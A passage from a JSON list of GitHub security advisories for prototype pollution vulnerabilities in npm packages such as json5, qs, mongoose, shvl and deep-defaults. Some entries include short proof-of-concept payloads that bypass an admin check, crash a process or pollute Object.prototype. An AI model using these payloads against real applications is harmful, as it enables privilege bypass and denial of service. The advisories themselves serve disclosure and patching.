      "description": "### Impact\nEvents sent with special strings in key places can temporarily disrupt or impede the matrix-js-sdk from functioning properly, potentially impacting the consumer's ability to process data safely. Note that the matrix-js-sdk can appear to be operating normally but be excluding or corrupting runtime data presented to the consumer.\n\n### Patches\nThis is fixed in matrix-js-sdk 19.4.0.\n\n### Workarounds\nRedacting applicable events, waiting for the sync processor to store data, and restarting the client can often fix it. Alternatively, redacting the applicable events and clearing all storage will often fix most perceived issues.\n\nIn some cases, no workarounds are possible.\n\n### References\nhttps://learn.snyk.io/lessons/prototype-pollution/javascript/\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
      "summary": "matrix-js-sdk Prototype Pollution vulnerability",
      "date": "2023-03-28T18:59:28Z",
      "cve": "CVE-2022-36059",
      "year": 2022
   },
   {
      "package": {
         "raw": "collection.js@6.7.11",
         "name": "collection.js",
         "version": "6.7.11"
      },
      "id": "GHSA-47pj-q2vm-46xc",
      "description": "Versions of the package collection.js before 6.8.1 are vulnerable to Prototype Pollution via the `extend` function in `Collection.js/dist/node/iterators/extend.js`.",
      "summary": "Collection.js vulnerable to Prototype Pollution",
      "date": "2023-03-18T06:30:15Z",
      "cve": "CVE-2023-26113",
      "year": 2023
   },
   {
      "package": {
         "raw": "dot-lens@1.2.3",
         "name": "dot-lens",
         "version": "1.2.3"
      },
      "id": "GHSA-rmhg-2cvv-q7vx",
      "description": "All versions of the package dot-lens are vulnerable to Prototype Pollution via the `set()` function in `index.js` file.",
      "summary": "dot-lens vulnerable to Prototype Pollution",
      "date": "2023-03-06T06:30:18Z",
      "cve": "CVE-2023-26106",
      "year": 2023
   },
   {
      "package": {
         "raw": "utilities@1.0.6",
         "name": "utilities",
         "version": "1.0.6"
      },
      "id": "GHSA-wxfj-84xf-7gxv",
      "description": "All versions of the package utilities are vulnerable to Prototype Pollution via the _mix function.",
      "summary": "mde utilities contains Prototype Pollution",
      "date": "2023-02-28T06:30:25Z",
      "cve": "CVE-2023-26105",
      "year": 2023
   },
   {
      "package": {
         "raw": "rangy@1.3.1",
         "name": "rangy",
         "version": "1.3.1"
      },
      "id": "GHSA-65rp-mhqf-8gj3",
      "description": "All versions of the package rangy are vulnerable to Prototype Pollution when using the `extend()` function in file `rangy-core.js`.The function uses recursive merge which can lead an attacker to modify properties of the Object.prototype.",
      "summary": "rangy vulnerable to Prototype Pollution",
      "date": "2023-02-24T06:30:16Z",
      "cve": "CVE-2023-26102",
      "year": 2023
   },
   {
      "package": {
         "raw": "convict@6.2.3",
         "name": "convict",
         "version": "6.2.3"
      },
      "id": "GHSA-4jrm-c32x-w4jf",
      "description": "### Impact\n\n* An attacker can inject attributes that are used in other components\n* An attacker can override existing attributes with ones that have incompatible type, which may lead to a crash.\n\nThe main use case of Convict is for handling server-side configurations written by the admins owning the servers, and not random users. So it's unlikely that an admin would deliberately sabotage their own server. Still a situation can happen where an admin not knowledgeable about JavaScript could be tricked by an attacker into writing the malicious JavaScript code into some config files.\n\n### Patches\nThe problem is patched in `convict@6.2.4`. Users should upgrade to `convict@6.2.4`.\n\n### Workarounds\nNo way for users to fix or remediate the vulnerability without upgrading\n\n### References\nhttps://github.com/mozilla/node-convict/issues/410\n",
      "summary": "convict vulnerable to Prototype Pollution",
      "date": "2023-01-10T21:50:00Z",
      "cve": "CVE-2023-0163",
      "year": 2023
   },
   {
      "package": {
         "raw": "baobab@2.6.0",
         "name": "baobab",
         "version": "2.6.0"
      },
      "id": "GHSA-wvr2-q86m-6whp",
      "description": "A vulnerability was found in Yomguithereal Baobab up to 2.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack can be launched remotely. Upgrading to version 2.6.1 is able to address this issue. The name of the patch is c56639532a923d9a1600fb863ec7551b188b5d19. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217627.",
      "summary": "Baobab vulnerable to Prototype Pollution",
      "date": "2023-01-07T21:30:38Z",
      "cve": "CVE-2021-4307",
      "year": 2021
   },
   {
      "package": {
         "raw": "json5@2.2.1",
         "name": "json5",
         "version": "2.2.1"
      },
      "id": "GHSA-9c47-m6qq-7p4h",
      "description": "The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```",
      "summary": "Prototype Pollution in JSON5 via Parse Method",
      "date": "2022-12-29T01:51:03Z",
      "cve": "CVE-2022-46175",
      "year": 2022
   },
   {
      "package": {
         "raw": "json-pointer@0.6.1",
         "name": "json-pointer",
         "version": "0.6.1"
      },
      "id": "GHSA-6xrf-q977-5vgc",
      "description": "A vulnerability, which was classified as critical, has been found in json-pointer up to 0.6.1. Affected by this issue is the function set of the file index.js. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack may be launched remotely. Upgrading to version 0.6.2 is able to address this issue. The patch is identified as 859c9984b6c407fc2d5a0a7e47c7274daa681941. It is recommended to upgrade the affected component. VDB-216794 is the identifier assigned to this vulnerability.",
      "summary": "json-pointer vulnerable to Prototype Pollution",
      "date": "2022-12-26T09:30:25Z",
      "cve": "CVE-2022-4742",
      "year": 2022
   },
   {
      "package": {
         "raw": "fast-json-patch@3.1.0",
         "name": "fast-json-patch",
         "version": "3.1.0"
      },
      "id": "GHSA-8gh8-hqwg-xf34",
      "description": "A vulnerability has been found in Starcounter-Jack JSON-Patch up to 3.1.0 and classified as problematic. This vulnerability affects unknown code. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 3.1.1 can address this issue. The name of the patch is 7ad6af41eabb2d799f698740a91284d762c955c9. It is recommended to upgrade the affected component. VDB-216778 is the identifier assigned to this vulnerability.",
      "summary": "Starcounter-Jack JSON-Patch Prototype Pollution vulnerability",
      "date": "2022-12-25T21:30:22Z",
      "cve": "CVE-2021-4279",
      "year": 2021
   },
   {
      "package": {
         "raw": "dustjs-linkedin@2.7.5",
         "name": "dustjs-linkedin",
         "version": "2.7.5"
      },
      "id": "GHSA-c6rp-wrp9-qr4q",
      "description": "A vulnerability was found in LinkedIn dustjs prior to version 3.0.0 and classified as problematic. Affected by this issue is some unknown functionality. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack may be launched remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 3.0.0 can address this issue. The name of the patch is ddb6523832465d38c9d80189e9de60519ac307c3. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216464.",
      "summary": "dustjs-linkedin vulnerable to Prototype Pollution",
      "date": "2022-12-21T21:30:15Z",
      "cve": "CVE-2021-4264",
      "year": 2021
   },
   {
      "package": {
         "raw": "safe-eval@0.4.1",
         "name": "safe-eval",
         "version": "0.4.1"
      },
      "id": "GHSA-33vh-7x8q-mg35",
      "description": "All versions of package safe-eval are vulnerable to Prototype Pollution which allows an attacker to add or modify properties of the Object.prototype.Consolidate when using the function safeEval. This is because the function uses vm variable, leading an attacker to modify properties of the Object.prototype.",
      "summary": "safe-eval vulnerable to Prototype Pollution",
      "date": "2022-12-20T06:30:36Z",
      "cve": "CVE-2022-25904",
      "year": 2022
   },
   {
      "package": {
         "raw": "whois@2.13.5",
         "name": "whois",
         "version": "2.13.5"
      },
      "id": "GHSA-97jv-c342-5xhc",
      "description": "A vulnerability classified as critical has been found in Furqan node-whois. Affected is an unknown function of the file `index.coffee`. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). It is possible to launch the attack remotely. The name of the patch is 46ccc2aee8d063c7b6b4dee2c2834113b7286076. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-216252.",
      "summary": "FurqanSoftware/node-whois vulnerable to Prototype Pollution",
      "date": "2022-12-19T15:30:29Z",
      "cve": "CVE-2020-36618",
      "year": 2020
   },
   {
      "package": {
         "raw": "qs@6.10.2",
         "name": "qs",
         "version": "6.10.2"
      },
      "id": "GHSA-hrpp-h998-j3pp",
      "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
      "summary": "qs vulnerable to Prototype Pollution",
      "date": "2022-11-27T00:30:50Z",
      "cve": "CVE-2022-24999",
      "year": 2022
   },
   {
      "package": {
         "raw": "parse-server@4.10.19",
         "name": "parse-server",
         "version": "4.10.19"
      },
      "id": "GHSA-93vw-8fm5-p2jf",
      "description": "### Impact\n\nA compromised Parse Server Cloud Code Webhook target endpoint allows an attacker to use prototype pollution to bypass the Parse Server `requestKeywordDenylist` option.\n\n### Patches\n\nImproved keyword detection.\n\n### Workarounds\n\nNone.\n\n### Collaborators\n\nMikhail Shcherbakov, Cristian-Alexandru Staicu and Musard Balliu working with Trend Micro Zero Day Initiative\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-93vw-8fm5-p2jf",
      "summary": "Parse Server is vulnerable to Prototype Pollution via Cloud Code Webhooks",
      "date": "2022-11-10T13:02:35Z",
      "cve": "CVE-2022-41879",
      "year": 2022
   },
   {
      "package": {
         "raw": "parse-server@4.10.18",
         "name": "parse-server",
         "version": "4.10.18"
      },
      "id": "GHSA-xprv-wvh7-qqqx",
      "description": "### Impact\n\nKeywords that are specified in the Parse Server option `requestKeywordDenylist` can be injected via Cloud Code Webhooks or Triggers. This will result in the keyword being saved to the database, bypassing the `requestKeywordDenylist` option.\n\n### Patches\n\nImproved keyword detection.\n\n### Workarounds\n\nConfigure your firewall to only allow trusted servers to make request to the Parse Server Cloud Code Webhooks API, or block the API completely if you are not using the feature.\n\n### Collaborators\n\nMikhail Shcherbakov, Cristian-Alexandru Staicu and Musard Balliu working with Trend Micro Zero Day Initiative\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-xprv-wvh7-qqqx\n",
      "summary": "Parse Server vulnerable to Prototype Pollution via Cloud Code Webhooks or Cloud Code Triggers",
      "date": "2022-11-09T20:47:27Z",
      "cve": "CVE-2022-41878",
      "year": 2022
   },
   {
      "package": {
         "raw": "deep-object-diff@1.1.8",
         "name": "deep-object-diff",
         "version": "1.1.8"
      },
      "id": "GHSA-653v-rqx9-j85p",
      "description": "deep-object-diff before version 1.1.6 allows an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited. This issue was fixed in version 1.1.9.",
      "summary": "deep-object-diff vulnerable to Prototype Pollution",
      "date": "2022-11-04T12:00:25Z",
      "cve": "CVE-2022-41713",
      "year": 2022
   },
   {
      "package": {
         "raw": "fastest-json-copy@1.0.1",
         "name": "fastest-json-copy",
         "version": "1.0.1"
      },
      "id": "GHSA-p5g9-rjcf-95vj",
      "description": "fastest-json-copy version 1.0.1 allows an external attacker to edit or add new properties to an object. This is possible because the application does not correctly validate the incoming JSON keys, thus allowing the `__proto__` property to be edited.",
      "summary": "fastest-json-copy vulnerable to Prototype Pollution",
      "date": "2022-11-04T12:00:25Z",
      "cve": "CVE-2022-41714",
      "year": 2022
   },
   {
      "package": {
         "raw": "browserify-shim@3.8.15",
         "name": "browserify-shim",
         "version": "3.8.15"
      },
      "id": "GHSA-cfgr-75jx-h88g",
      "description": "Prototype pollution vulnerability in function resolveShims in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the shimPath variable in resolve-shims.js.",
      "summary": "thlorenz browserify-shim vulnerable to prototype pollution",
      "date": "2022-10-31T19:00:36Z",
      "cve": "CVE-2022-37623",
      "year": 2022
   },
   {
      "package": {
         "raw": "browserify-shim@3.8.15",
         "name": "browserify-shim",
         "version": "3.8.15"
      },
      "id": "GHSA-r737-347m-wqc7",
      "description": "Prototype pollution vulnerability in function resolveShims in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the fullPath variable in resolve-shims.js.",
      "summary": "thlorenz browserify-shim vulnerable to prototype pollution",
      "date": "2022-10-29T12:00:47Z",
      "cve": "CVE-2022-37621",
      "year": 2022
   },
   {
      "package": {
         "raw": "grunt-karma@4.0.1",
         "name": "grunt-karma",
         "version": "4.0.1"
      },
      "id": "GHSA-hcj4-xf6x-63wj",
      "description": "Prototype pollution vulnerability in karma-runner grunt-karma 4.0.1 via the `key` variable in `grunt-karma.js`.",
      "summary": "Grunt-karma vulnerable to prototype pollution",
      "date": "2022-10-14T12:00:16Z",
      "cve": "CVE-2022-37602",
      "year": 2022
   },
   {
      "package": {
         "raw": "loader-utils@2.0.2",
         "name": "loader-utils",
         "version": "2.0.2"
      },
      "id": "GHSA-76p3-8jx3-jpfq",
      "description": "Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils prior to version 2.0.3 via the name variable in parseQuery.js.",
      "summary": "Prototype pollution in webpack loader-utils",
      "date": "2022-10-13T12:00:28Z",
      "cve": "CVE-2022-37601",
      "year": 2022
   },
   {
      "package": {
         "raw": "mockery@2.1.0",
         "name": "mockery",
         "version": "2.1.0"
      },
      "id": "GHSA-gmwp-3pwc-3j3g",
      "description": "Prototype pollution vulnerability in function enable in mockery.js in mfncooper mockery commit 822f0566fd6d72af8c943ae5ca2aa92e516aa2cf via the key variable in mockery.js.",
      "summary": "mockery is vulnerable to prototype pollution",
      "date": "2022-10-12T19:00:41Z",
      "cve": "CVE-2022-37614",
      "year": 2022
   },
   {
      "package": {
         "raw": "browserify-shim@3.8.15",
         "name": "browserify-shim",
         "version": "3.8.15"
      },
      "id": "GHSA-866w-wm4h-95c6",
      "description": "Prototype pollution vulnerability in function `resolveShims` in resolve-shims.js in thlorenz browserify-shim 3.8.15 via the `k` variable in resolve-shims.js.",
      "summary": "thlorenz browserify-shim vulnerable to prototype pollution",
      "date": "2022-10-12T12:00:18Z",
      "cve": "CVE-2022-37617",
      "year": 2022
   },
   {
      "package": {
         "raw": "gh-pages@4.0.0",
         "name": "gh-pages",
         "version": "4.0.0"
      },
      "id": "GHSA-8mmm-9v2q-x3f9",
      "description": "Prototype pollution vulnerability in tschaub gh-pages via the partial variable in util.js.",
      "summary": "tschaub gh-pages vulnerable to prototype pollution",
      "date": "2022-10-12T12:00:18Z",
      "cve": "CVE-2022-37611",
      "year": 2022
   },
   {
      "package": {
         "raw": "xmldom@0.6.0",
         "name": "xmldom",
         "version": "0.6.0"
      },
      "id": "GHSA-9pgh-qqpf-7wqj",
      "description": "## Withdrawn\n\nThis advisory has been withdrawn because the maintainers of `@xmldom/xmldom` and multiple third parties disputed the validity of the issue. Attempts to create or replicate a proof of concept have been unsuccessful.\n\n## Original Description\n\n### Impact\nA prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).\n\n### Workarounds\nNone\n\n### References\nhttps://github.com/xmldom/xmldom/pull/437\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n* Add information to https://github.com/xmldom/xmldom/issues/436\n",
      "summary": "Withdrawn: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in @xmldom/xmldom and xmldom",
      "date": "2022-10-11T20:42:57Z",
      "cve": "CVE-2022-37616",
      "year": 2022
   },
   {
      "package": {
         "raw": "@hapi/hoek@8.5.0",
         "name": "hoek",
         "version": "8.5.0",
         "scope": "hapi"
      },
      "id": "GHSA-c429-5p7v-vgjp",
      "description": "hoek versions prior to 8.5.1, and 9.x prior to 9.0.3 are vulnerable to prototype pollution in the clone function. If an object with the __proto__ key is passed to clone() the key is converted to a prototype. This issue has been patched in version 9.0.3, and backported to 8.5.1.",
      "summary": "hoek subject to prototype pollution via the clone function.",
      "date": "2022-09-25T00:00:27Z",
      "cve": "CVE-2020-36604",
      "year": 2020
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-wc4x-qmr2-rj8h",
      "description": "Prototype pollution vulnerability in stealjs steal via the alias variable in babel.js.",
      "summary": "steal vulnerable to Prototype Pollution via alias variable",
      "date": "2022-09-21T00:00:38Z",
      "cve": "CVE-2022-37265",
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-gvjw-8mmr-8f6g",
      "description": "Prototype pollution vulnerability in function convertLater in npm-convert.js in stealjs steal 2.2.4 via the packageName variable in npm-convert.js.",
      "summary": "steal vulnerable to Prototype Pollution",
      "date": "2022-09-17T00:00:30Z",
      "cve": "CVE-2022-37258",
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-93q5-3xpc-8vg3",
      "description": "Prototype pollution vulnerability in function convertLater in npm-convert.js in stealjs steal via the requestedVersion variable in the npm-convert.js file.",
      "summary": "steal vulnerable to Prototype Pollution via requestedVersion variable",
      "date": "2022-09-16T00:00:39Z",
      "cve": "CVE-2022-37257",
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-vwhq-pm3r-fjm9",
      "description": "Prototype pollution vulnerability in function extend in babel.js in stealjs steal via the key variable in babel.js.",
      "summary": "steal vulnerable to Prototype Pollution via key variable in babel.js",
      "date": "2022-09-16T00:00:39Z",
      "cve": "CVE-2022-37266",
      "year": 2022
   },
   {
      "package": {
         "raw": "steal@2.3.0",
         "name": "steal",
         "version": "2.3.0"
      },
      "id": "GHSA-8f8g-9j73-7p82",
      "description": "Prototype pollution vulnerability in stealjs steal 2.2.4 via the optionName variable in main.js.",
      "summary": "steal vulnerable to Prototype Pollution via optionName variable",
      "date": "2022-09-16T00:00:36Z",
      "cve": "CVE-2022-37264",
      "year": 2022
   },
   {
      "package": {
         "raw": "mongoose@6.4.5",
         "name": "mongoose",
         "version": "6.4.5"
      },
      "id": "GHSA-h8hf-x3f4-xwgp",
      "description": "### Description\nMongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the `schema` object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.\n\n### Proof of Concept\n```js\n// poc.js\nconst mongoose = require('mongoose');\nconst schema = new mongoose.Schema();\n\nmalicious_payload = '__proto__.toString'\n\nschema.path(malicious_payload, [String])\n\nx = {}\nconsole.log(x.toString()) // crashed (Denial of service (DoS) attack)\n```\n\n### Impact\nThis vulnerability can be manipulated to exploit other types of attacks, such as Denial of service (DoS), Remote Code Execution, or Property Injection.",
      "summary": "Mongoose Vulnerable to Prototype Pollution in Schema Object",
      "date": "2022-08-27T00:00:54Z",
      "cve": "CVE-2022-24304",
      "year": 2022
   },
   {
      "package": {
         "raw": "ts-deepmerge@2.0.1",
         "name": "ts-deepmerge",
         "version": "2.0.1"
      },
      "id": "GHSA-7qqq-gh2f-wq76",
      "description": "The package ts-deepmerge before version 2.0.2 is vulnerable to Prototype Pollution due to missing sanitization of the `merge` function.",
      "summary": "ts-deepmerge before 2.0.2 vulnerable to Prototype Pollution",
      "date": "2022-08-10T00:00:31Z",
      "cve": "CVE-2022-25907",
      "year": 2022
   },
   {
      "package": {
         "raw": "mongoose@6.4.5",
         "name": "mongoose",
         "version": "6.4.5"
      },
      "id": "GHSA-f825-f98c-gj3g",
      "description": "Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment. Affected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the schema object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.",
      "summary": "automattic/mongoose vulnerable to Prototype pollution via Schema.path",
      "date": "2022-07-29T00:00:18Z",
      "cve": "CVE-2022-2564",
      "year": 2022
   },
   {
      "package": {
         "raw": "conf-cfg-ini@1.2.1",
         "name": "conf-cfg-ini",
         "version": "1.2.1"
      },
      "id": "GHSA-m6mg-jvjf-w44x",
      "description": "This affects the package conf-cfg-ini before 1.2.2. If an attacker submits a malicious INI file to an application that parses it with decode, they will pollute the prototype on the application. This can be exploited further depending on the context.",
      "summary": "conf-cfg-ini Prototype Pollution via malicious INI file before v1.2.2",
      "date": "2022-07-26T00:01:06Z",
      "cve": "CVE-2020-28441",
      "year": 2020
   },
   {
      "package": {
         "raw": "deep.assign@0.0.0-alpha.0",
         "name": "deep.assign",
         "version": "0.0.0-alpha.0"
      },
      "id": "GHSA-3829-mgmw-jcg4",
      "description": "deep.assign npm package 0.0.0-alpha.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
      "summary": "Prototype Pollution in deep.assign",
      "date": "2022-07-01T00:01:14Z",
      "cve": "CVE-2021-40663",
      "year": 2021
   },
   {
      "package": {
         "raw": "deep-get-set@1.1.1",
         "name": "deep-get-set",
         "version": "1.1.1"
      },
      "id": "GHSA-mjjj-6p43-vhhv",
      "description": "All versions of package deep-get-set are vulnerable to Prototype Pollution via the 'deep' function. **Note:** This vulnerability derives from an incomplete fix of [CVE-2020-7715](https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666)",
      "summary": "Prototype Pollution in deep-get-set",
      "date": "2022-06-25T00:00:51Z",
      "cve": "CVE-2022-21231",
      "year": 2022
   },
   {
      "package": {
         "raw": "mout@1.2.3",
         "name": "mout",
         "version": "1.2.3"
      },
      "id": "GHSA-vvv8-xw5f-3f88",
      "description": "This affects all versions of package mout. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn mixes objects into the target object, recursively mixing existing child objects as well. In both cases, the key used to access the target object recursively is not checked, leading to exploiting this vulnerability. **Note:** This vulnerability derives from an incomplete fix of [CVE-2020-7792](https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544).",
      "summary": "Prototype Pollution in mout",
      "date": "2022-06-18T00:00:20Z",
      "cve": "CVE-2022-21213",
      "year": 2022
   },
   {
      "package": {
         "raw": "querymen@2.1.4",
         "name": "querymen",
         "version": "2.1.4"
      },
      "id": "GHSA-p23c-p8w2-ww5v",
      "description": "All versions of package querymen are vulnerable to Prototype Pollution if the parameters of exported function handler(type, name, fn) can be controlled by users without any sanitization. Note: This vulnerability derives from an incomplete fix of [CVE-2020-7600](https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867).",
      "summary": "Prototype Pollution in querymen",
      "date": "2022-06-18T00:00:19Z",
      "cve": "CVE-2022-25871",
      "year": 2022
   },
   {
      "package": {
         "raw": "protobufjs@6.11.2",
         "name": "protobufjs",
         "version": "6.11.2"
      },
      "id": "GHSA-g954-5hwp-pp24",
      "description": "The package protobufjs is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype. Versions after and including 6.10.0 until 6.10.3 and after and including 6.11.0 until 6.11.3 are vulnerable.\n\nThis vulnerability can occur in multiple ways:\n1. by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions\n2. by parsing/loading .proto files\n\n\n",
      "summary": "Prototype Pollution in protobufjs",
      "date": "2022-05-28T00:00:20Z",
      "cve": "CVE-2022-25878",
      "year": 2022
   },
   {
      "package": {
         "raw": "mootools-more@1.5.2",
         "name": "mootools-more",
         "version": "1.5.2"
      },
      "id": "GHSA-fw45-938v-p26j",
      "description": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in mootools-more 1.6.0 allows a malicious user to inject properties into Object.prototype.",
      "summary": "mootools-more vulnerable to prototype pollution",
      "date": "2022-05-24T22:01:34Z",
      "cve": "CVE-2021-20088",
      "year": 2021
   },
   {
      "package": {
         "raw": "deep-defaults@1.0.5",
         "name": "deep-defaults",
         "version": "1.0.5"
      },
      "id": "GHSA-h6xg-rg33-9mf4",
      "description": "### Overview\nPrototype pollution vulnerability in 'deep-defaults' versions 1.0.0 through 1.0.5 allows attacker to cause a denial of service and may lead to remote code execution.\n\n### Details\nThe NPM module `deep-defaults` can be abused by Prototype Pollution vulnerability since the function `_deepDefaults()` does not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.\n\n### PoC\nThe `_deepDefaults ()` function accepts `dest`, `src` as arguments. Due to the absence of validation on the values passed into the `src` argument, an attacker can supply a malicious value by adjusting the value to include the `__proto__` property. Since there is no validation before assigning the property to check whether the assigned argument is the Object's own property or not, the property `polluted` will be directly be assigned to the new object thereby polluting the Object prototype. Later in the code, if there is a check to validate `polluted` the valued would be substituted as \"Yes! Its Polluted\" as it had been polluted.\n\n```js\nvar deepDefaults = require(\"deep-defaults\")\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"Yes! Its Polluted\"}}';\nvar obj ={};\nconsole.log(\"Before : \" + {}.polluted);\ndeepDefaults(obj, JSON.parse(malicious_payload));\nconsole.log(\"After : \" + {}.polluted);\n```",
      "summary": "deep-defaults vulnerable to prototype pollution",
      "date": "2022-05-24T19:03:10Z",
      "cve": "CVE-2021-25944",
      "year": 2021
   },
   {
      "package": {
         "raw": "jquery-query-object@2.2.3",
         "name": "jquery-query-object",
         "version": "2.2.3"
      },
      "id": "GHSA-q9xg-h756-8689",
      "description": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in jquery-plugin-query-object 2.2.3 allows a malicious user to inject properties into Object.prototype.",
      "summary": "jquery-plugin-query-object contains prototype pollution vulnerability",
      "date": "2022-05-24T17:48:43Z",
      "cve": "CVE-2021-20083",
      "year": 2021
   },
   {
      "package": {
         "raw": "shvl@2.0.1",
         "name": "shvl",
         "version": "2.0.1"
      },
      "id": "GHSA-pqwc-3vhw-qcvq",
      "description": "### Overview\nPrototype pollution vulnerability in 'shvl' versions 1.0.0 through 2.0.1 allows an attacker to cause a denial of service and may lead to remote code execution.\n\n### Details\nThe NPM module 'shvl' can be abused by Prototype Pollution vulnerability since the function 'set()' did not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.\n\n### PoC Details\nThe 'set()' function accepts four arguments `object, path, val, obj`. Due to the absence of validation, at values passed into `path, val` arguments, an attacker can supply a malicious value by adjusting the `path` value to include the `__proto__` property. Since there is no validation before assigning property to check whether the assigned `path` is the Object's own property or not, the property `isAdmin` will be directly be assigned to the empty obj({}) thereby polluting the Object prototype. Later in the code, if there is a check to validate `isAdmin` the valued would be substituted as \"true\" as it had been polluted.\n\n```js\nconst shvl = require('shvl');\nvar obj = {}\nconsole.log(\"Before : \" + obj.isAdmin);\nshvl.set(obj, '__proto__.isAdmin', true);\nconsole.log(\"After : \" + obj.isAdmin);\n```\n\n### Affected Environments\n1.0.0-2.0.1\n\n### Remediation\nThere are a couple of ways to mitigate prototype pollution vulnerabilities, for example: Most of the cases can be solved by freezing an object which doesn’t allow to add, remove, or change its properties. Validating the JSON input with schema validation, this guarantees that the JSON input contains only predefined attributes. We can change the objects, so they won’t have any prototype association by using “Object.create”.",
      "summary": "shvl vulnerable to prototype pollution",
      "date": "2022-05-24T17:37:25Z",
      "cve": "CVE-2020-28278",
      "year": 2020
   },
   {
